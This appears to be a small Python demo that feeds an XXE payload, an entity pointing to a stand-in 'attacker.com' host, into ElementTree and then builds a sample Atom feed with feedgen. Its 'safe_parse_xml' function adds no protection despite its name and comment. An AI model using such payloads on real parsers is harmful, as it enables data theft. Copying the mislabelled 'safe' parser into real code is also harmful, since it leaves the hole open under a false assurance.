from feedgen.feed import FeedGenerator
import xml.etree.ElementTree as ET
import io

# Malicious XML
malicious_xml = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious">
]>
<feed>
  <entry>
    <title>Example Entry</title>
    <content>&xxe;</content>
  </entry>
</feed>
"""

# Function to safely parse XML
def safe_parse_xml(xml_string):
    try:
        # Parse the XML using ElementTree
        # This will raise an exception if the XML is too large or malformed
        tree = ET.parse(io.StringIO(xml_string))
        return tree
    except ET.ParseError as e:
        print("ParseError:", e)
    except Exception as e:
        print("An error occurred:", e)

# Main function to demonstrate loading XML
def main():
    # Attempt to parse the malicious XML
    print("Attempting to parse malicious XML...")
    safe_parse_xml(malicious_xml)

    # Create a FeedGenerator instance
    fg = FeedGenerator()
    fg.id('http://example.com')
    fg.title('Example Feed')
    fg.link(href='http://example.com', rel='self')
    fg.description('This is an example feed.')

    # Add an entry to the feed
    entry = fg.add_entry()
    entry.id('http://example.com/item1')
    entry.title('Item 1')
    entry.link(href='http://example.com/item1')
    entry.description('This is the first item.')

    # Generate the feed
    feed_xml = fg.atom_str(pretty=True)
    print("Generated Feed XML:")
    print(feed_xml)

if __name__ == "__main__":
    main()